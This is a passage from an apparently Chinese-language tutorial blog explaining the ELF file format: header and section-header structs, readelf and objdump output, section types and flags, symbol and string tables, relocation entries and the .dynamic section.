class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word    e_version;              <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr    e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off     e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off     e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word    e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half    e_ehsize;               <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half    e_phentsize;            <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half    e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shentsize;            <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half    e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shstrndx;             <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>其中，e_ident数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src="/images/150-4.png" alt></p><p>&gt;</p><blockquote><p>从上面的结构体可以看出，ELF头部的大小为<code>16+2+2+4+4+4+4+4+2+2+2+2+2+2</code> = <code>52</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -h <span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><blockquote><p>得到如下的结果c</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 |</span><br><span class="line">| Class:                             ELF32|</span><br><span class="line">| Data:                              2&apos;s complement, little endian|</span><br><span class="line">| Version:                           1 (current)|</span><br><span class="line">| OS/ABI:                            UNIX - System V|</span><br><span class="line">| ABI Version:                       0|</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">  Type:                              DYN (Shared object file)              </span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1070</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          14384 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         30</span><br><span class="line">  Section header string table index: 29</span><br></pre></td></tr></table></figure><blockquote><p>可以从上面得到如下信息：</p><ul><li>程序入口的地址</li><li>程序头的偏移</li><li>段表头的偏移：里面包含各个段的大小、偏移和其他相关信息</li><li>段表的数量：通过段表头的偏移+每段固定的大小+段表的数量，就可以确定section的大小范围</li></ul></blockquote><p>上述实例代码中的头部信息为：</p><p><img src="/images/150-3.png" alt></p><h3 id="2-ELF的程序头"><a href="#2-ELF的程序头" class="headerlink" title="2.ELF的程序头"></a>2.ELF的程序头</h3><blockquote><p>程序头部表（Program Header Table），如果存在的话，则是告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</p></blockquote><font size="2">通过ELF的文件头可以看出，文中实例的程序头位于ELF文件的`52`字节的偏移处</font><h3 id="3-ELF的段表"><a href="#3-ELF的段表" class="headerlink" title="3.ELF的段表"></a>3.ELF的段表</h3><p>ELF的段表结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word    sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word    sh_flags;               <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr    sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off     sh_offset;              <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word    sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word    sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word    sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word    sh_addralign;           <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word    sh_entsize;             <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><blockquote><p>可以看出段表的每一个段的信息大小都是固定的<code>10*4=40</code>个字节，用<code>readelf -S test</code>，查看实例中的ELF文件的段表，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">There are 30 section headers, starting at offset 0x3830:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        00000194 000194 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.gnu.bu[...] NOTE            000001a8 0001a8 000024 00   A  0   0  4</span><br><span class="line">  [ 3] .note.ABI-tag     NOTE            000001cc 0001cc 000020 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        000001ec 0001ec 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          0000020c 00020c 000090 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0000029c 00029c 0000b6 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          00000352 000352 000012 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         00000364 000364 000040 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             000003a4 0003a4 000040 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             000003e4 0003e4 000018 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        00001000 001000 000020 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        00001020 001020 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        00001060 001060 000008 08  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        00001070 001070 000275 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        000012e8 0012e8 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        00002000 002000 00007b 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        0000207c 00207c 000054 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        000020d0 0020d0 000160 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      00003ef4 002ef4 000004 04  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      00003ef8 002ef8 000004 04  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         00003efc 002efc 0000f0 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        00003fec 002fec 000014 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        00004000 003000 000018 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        00004018 003018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          00004020 003020 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 003020 00001e 01  MS  0   0  1</span><br><span class="line">  [27] .symtab           SYMTAB          00000000 003040 000470 10     28  45  4</span><br><span class="line">  [28] .strtab           STRTAB          00000000 0034b0 00027a 00      0   0  1</span><br><span class="line">  [29] .shstrtab         STRTAB          00000000 00372a 000105 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure><blockquote><p>一共有30个段，验证了ELF文件头的<code>Number of section headers: 30</code>，那么整个段表的大小就是：段的个数*每个段信息的固定大小，该实例中段表的大小为：<code>30\*40=1200</code>。</p></blockquote><p><img src="/images/150-6.png" alt></p><p>ELF文件结构示意图中定义的<code>Elf_Shdr</code>的各个成员的含义与readelf具有对应关系。如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>节名<br><font size="2" color="navy">节名是一个字符串，保存在一个名为<code>.shstrtab</code>的字符串表（可通过Section Header索引到）。<br>sh_name的值实际上是其节名字符串在<code>.shstrtab</code>中的偏移值</font></td></tr><tr><td>sh_type</td><td>节类型</td></tr><tr><td>sh_flags</td><td>节标志位</td></tr><tr><td>sh_addr</td><td>节地址：节的虚拟地址<br><font size="2" color="navy">如果该节可以被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址；否则sh_addr为0</font></td></tr><tr><td>sh_offset</td><td>节偏移<br><font size="2" color="navy"><strong>如果该节存在于文件中，则表示该节在文件中的偏移；否则无意义，如sh_offset对于BSS 节来说是没有意义的</strong></font></td></tr><tr><td>sh_size</td><td>节大小</td></tr><tr><td>sh_link、sh_info</td><td>节链接信息</td></tr><tr><td>sh_addralign</td><td>节地址对齐方式</td></tr><tr><td>sh_entsize</td><td>节项大小<br><font size="2" color="navy">有些节包含了一些固定大小的项，如符号表，其包含的每个符号所在的大小都一样的，对于这种节，sh_entsize表示每个项的大小。<br><strong>如果为0，则表示该节不包含固定大小的项。</strong></font></td></tr></tbody></table></div><h4 id="①-节类型（sh-type）"><a href="#①-节类型（sh-type）" class="headerlink" title="① 节类型（sh_type）"></a>① 节类型（sh_type）</h4><blockquote><p>节名是一个字符串，只是在链接和编译过程中有意义，但它并不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）。</p></blockquote><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。常见的节类型如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>无效节</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。代码节、数据节都是这种类型。</td></tr><tr><td><strong>SHT_SYMTAB</strong></td><td>2</td><td><strong>符号表</strong></td></tr><tr><td><strong>SHT_STRTAB</strong></td><td>3</td><td><strong>字符串表</strong></td></tr><tr><td>SHT_RELA</td><td>4</td><td><strong>重定位表</strong>。该节包含了重定位信息</td></tr><tr><td>SHT_HASH</td><td>5</td><td><strong>符号表的哈希表</strong></td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>动态链接信息</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>提示性信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容。如<code>.bss</code>节</td></tr><tr><td>SHT_REL</td><td>9</td><td>该节包含了重定位信息</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>保留</td></tr><tr><td>SHT_DNYSYM</td><td>11</td><td><strong>动态链接的符号表</strong></td></tr></tbody></table></div><h4 id="②-节标志位（sh-flag）"><a href="#②-节标志位（sh-flag）" class="headerlink" title="② 节标志位（sh_flag）"></a>② 节标志位（sh_flag）</h4><p>节标志位表示该节在进程虚拟地址空间中的属性。如是否可写、是否可执行等。相关常量以<code>SHF_</code>开头。常见的节标志位如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>2</td><td>表示该节在进程空间中需要分配空间。<br>有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>4</td><td>表示该节在进程空间中可以被执行</td></tr></tbody></table></div><h3 id="4-节的分类"><a href="#4-节的分类" class="headerlink" title="4.节的分类"></a>4.节的分类</h3><p>上述ELF Section Header Table部分已经简单介绍了节类型。接下来我们来介绍详细一些比较重要的节。</p><h4 id="①-text节"><a href="#①-text节" class="headerlink" title="① .text节"></a>① .text节</h4><p><code>.text</code>节是保存了程序代码指令的<strong>代码节</strong>。<strong>一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中</strong>。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><img src="/images/150-7.png" alt></p><h4 id="②-rodata节"><a href="#②-rodata节" class="headerlink" title="② .rodata节"></a>② .rodata节</h4><p><code>rodata</code>节保存了只读的数据，如一行C语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="③-plt节（过程链接表）"><a href="#③-plt节（过程链接表）" class="headerlink" title="③ .plt节（过程链接表）"></a>③ .plt节（过程链接表）</h4><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，<strong>其包含了动态链接器调用从共享库导入的函数所必需的相关代码</strong>。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="④-data节"><a href="#④-data节" class="headerlink" title="④ .data节"></a>④ .data节</h4><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑤-bss节"><a href="#⑤-bss节" class="headerlink" title="⑤ .bss节"></a>⑤ .bss节</h4><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本省的空间。<strong><code>.bss</code>节保存了未进行初始化的全局数据</strong>。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><h4 id="⑥-got-plt节（全局偏移表-过程链接表）"><a href="#⑥-got-plt节（全局偏移表-过程链接表）" class="headerlink" title="⑥ .got.plt节（全局偏移表-过程链接表）"></a>⑥ .got.plt节（全局偏移表-过程链接表）</h4><p><code>.got</code>节保存了<strong>全局偏移表</strong>。<strong><code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改</strong>。由于<code>.got.plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑦-dynsym节（动态链接符号表）"><a href="#⑦-dynsym节（动态链接符号表）" class="headerlink" title="⑦ .dynsym节（动态链接符号表）"></a>⑦ .dynsym节（动态链接符号表）</h4><p><code>.dynsym</code>节保存在<code>text</code>段中。<strong>其保存了从共享库导入的动态符号表</strong>。节类型为<code>SHT_DYNSYM</code>。</p><h4 id="⑧-dynstr节（动态链接字符串表）"><a href="#⑧-dynstr节（动态链接字符串表）" class="headerlink" title="⑧ .dynstr节（动态链接字符串表）"></a>⑧ .dynstr节（动态链接字符串表）</h4><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><h4 id="⑨-rel-节（重定位表）"><a href="#⑨-rel-节（重定位表）" class="headerlink" title="⑨ .rel.*节（重定位表）"></a>⑨ .rel.*节（重定位表）</h4><p>重定位表保存了重定位相关的信息，<strong>这些信息描述了如何在链接或运行时，对ELF目标文件的某部分或者进程镜像进行补充或修改</strong>。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><h4 id="⑩-hash节"><a href="#⑩-hash节" class="headerlink" title="⑩ .hash节"></a>⑩ .hash节</h4><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><h4 id="⑪-symtab节（符号表）"><a href="#⑪-symtab节（符号表）" class="headerlink" title="⑪ .symtab节（符号表）"></a>⑪ .symtab节（符号表）</h4><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><img src="/images/150-5.png" alt></p><blockquote><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构中成员的含义如下表所示：</p></blockquote><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>符号名。该值为该符号名在字符串表中的偏移地址。</td></tr><tr><td>st_value</td><td>符号对应的值。存放符号的值（可能是地址或位置偏移量）。</td></tr><tr><td>st_size</td><td>符号的大小</td></tr><tr><td>st_other</td><td>0</td></tr><tr><td>st_shndx</td><td>符号所在的节</td></tr><tr><td>st_info</td><td>符号类型及绑定属性</td></tr></tbody></table></div><h4 id="⑫-strtab节（字符串表）"><a href="#⑫-strtab节（字符串表）" class="headerlink" title="⑫ .strtab节（字符串表）"></a>⑫ .strtab节（字符串表）</h4><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><blockquote><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p></blockquote><p>Elf文件中用到的字符串，如段名、函数名、变量名称等，均保存在字符串表中。其中，shstrtab段表字符串表仅用来保存段名，而strtab或dynstr section则是存放普通字符串，如函数、变量名等符号名称，字符串之间以”00”截断。</p><h4 id="⑬-ctors节和-dtors节"><a href="#⑬-ctors节和-dtors节" class="headerlink" title="⑬ .ctors节和.dtors节"></a>⑬ .ctors节和.dtors节</h4><p><code>.ctors</code>（<strong>构造器</strong>）节和<code>.dtors</code>（<strong>析构器</strong>）节分别保存了指向构造函数和析构函数的函数指针，<strong>构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码</strong>。</p><h4 id="⑭-自定义section"><a href="#⑭-自定义section" class="headerlink" title="⑭ 自定义section"></a>⑭ 自定义section</h4><p>在声明一个函数或变量时，可以加上<strong>attribute</strong>((section(“自定义section名”)))前缀的方式，将其添加到自定义段。</p><h3 id="5-ELF（动态）符号-字符串表的联系和区别"><a href="#5-ELF（动态）符号-字符串表的联系和区别" class="headerlink" title="5.ELF（动态）符号/字符串表的联系和区别"></a>5.ELF（动态）符号/字符串表的联系和区别</h3><div class="table-container"><table><thead><tr><th>名称</th><th>作用</th><th>name的值</th></tr></thead><tbody><tr><td>.dynsym</td><td><strong>其保存了从共享库导入的动态符号表</strong>。<br>节类型为<code>SHT_DYNSYM</code>。</td><td>对应.dystr中的偏移</td></tr><tr><td>.symtab</td><td>是一个<code>ElfN_Sym</code>的数组，保存了符号信息。<br>节类型为<code>SHT_SYMTAB</code>。</td><td>对应.strtab中的偏移</td></tr><tr><td>.dystr</td><td>对应于<code>.dynsym</code></td><td>无</td></tr><tr><td>.strtab</td><td>对应于<code>.symtab</code></td><td>无</td></tr><tr><td>.shstrtab</td><td>用于保存<strong>节头表中</strong>用到的字符串，可通过<code>sh_name</code>进行索引。</td><td>无</td></tr></tbody></table></div><h4 id="①-符号表结构"><a href="#①-符号表结构" class="headerlink" title="① 符号表结构"></a>① 符号表结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;               <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;               <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;               <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h3 id="6-重定位表"><a href="#6-重定位表" class="headerlink" title="6.重定位表"></a>6.重定位表</h3><blockquote><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p></blockquote><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -r hello.o</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000005 R_X86_64_32       .rodata</span><br><span class="line">000000000000000a R_X86_64_PC32     puts-0x0000000000000004</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000020 R_X86_64_PC32     .text</span><br></pre></td></tr></table></figure><p>重定位表是一个<code>Elf_Rel</code>类型的数组结构，每一项对应一个需要进行重定位的项。<br>其成员含义如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>▨ 重定位入口的偏移。<br>▨ 对于<strong>可重定位文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移<br>▨ 对于<strong>可执行文件或共享对象文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</td></tr><tr><td>r_info</td><td>▨ 重定位入口的类型和符号<br>▨ 因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。<br>    每种处理器都有自己的一套重定位入口的类型。<br>▨ 对于<strong>可执行文件和共享目标文件</strong>来说，它们的重定位入口是动态链接类型的。</td></tr></tbody></table></div><p>重定位是目标文件链接成为可执行文件的关键。我们将在后面的进行介绍。</p><h3 id="7-与动态链接相关的段表"><a href="#7-与动态链接相关的段表" class="headerlink" title="7.与动态链接相关的段表"></a>7.与动态链接相关的段表</h3><h4 id="①-dynamic"><a href="#①-dynamic" class="headerlink" title="① .dynamic"></a>① .dynamic</h4><blockquote><p>该段保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword   d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                 <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword  d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>d_tag 类型</th><th>d_un 的含义</th></tr></thead><tbody><tr><td>DT_SYMTAB</td><td>动态链接符号表的地址，d_ptr 表示 “.dynsym” 的地址</td></tr><tr><td>DT_STRTAB</td><td>动态链接字符串表的地址，d_ptr 表示 “.dynstr” 的地址</td></tr><tr><td>DT_STRSZ</td><td>动态链接字符串表大小，d_val 表示大小</td></tr><tr><td>DT_HASH</td><td>动态链接哈希表地址， d_ptr 表示 “.hash” 的地址</td></tr><tr><td>DT_SONAME</td><td>本共享对象的 “SO_NAME”</td></tr><tr><td>DT_RPATH</td><td>动态链接共享对象搜索路径</td></tr><tr><td>DT_INIT</td><td>初始化代码地址</td></tr><tr><td>DT_FINIT</td><td>结束代码地址</td></tr><tr><td>DT_NEED</td><td>依赖的共享对象文件，d_ptr表示所以来的共享对象文件名</td></tr><tr><td>DT_REL<br>DT_RELA</td><td>动态链接重定位段表地址</td></tr><tr><td>DT_RELENT<br>DT_RELAENT</td><td>动态重读位表入口数量</td></tr></tbody></table></div><blockquote><p>可以把<code>.dynamic</code>段看成动态链接下ELF文件的文件头</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -d <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2efc contains 26 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 